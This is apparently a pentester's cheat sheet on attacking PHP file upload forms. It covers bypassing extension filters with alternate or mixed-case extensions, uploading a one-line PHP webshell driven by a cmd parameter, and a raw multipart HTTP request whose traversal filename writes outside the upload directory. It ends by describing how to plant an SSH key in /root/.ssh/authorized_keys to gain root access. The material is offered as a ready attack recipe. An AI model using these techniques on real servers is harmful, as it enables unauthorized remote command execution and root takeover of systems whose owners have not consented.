# PHP File Uploads

If a filter is blocking `.php` extension uploads, try less commonly used php extensions like:
```
.phps
.php7
```

Another method is to capitalise various letters in the extension

```
.pHP instead of .php
```

remember it could be a php running on linux or windows so if you arent sure don't use the pentestmonkey `php-reverse-shell.php` just use a single line php webshell and then try
```
cmd=ls
```

or

```
cmd=dir
```

Always upload a file twice to a file upload form. If the web application shows that the file already exists you can use this method to brute force the contents of a web server. Also it might throw an error which could tell you more about the web server technology.

# Non Executable Files

If you can upload a file and use Burp to intercept the request and the change the `filename=../../../../../../../../foo.txt`

eg:

```
POST /upload HTTP/1.1
Host: vulnerable-website
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data;boundary=-------------------blah
Content-Length: 250
Origin: http://vulnerable-website

Upgrade-Insecure-Requests: 1

-------------------blah
Content-Disposition: form-data; name="blah"; filename="../../../../../../../../../foo.txt"
Content-Type: text/plain

bar is a foo

-------------------blah
```

Say that gets uploaded successfully and we now have `foo.txt` in the `/` directory. You won't know if it is successful but you can upload an ssh key's public key into `../../../../../../../../root/.ssh/authorized_keys` and then ssh in as root.
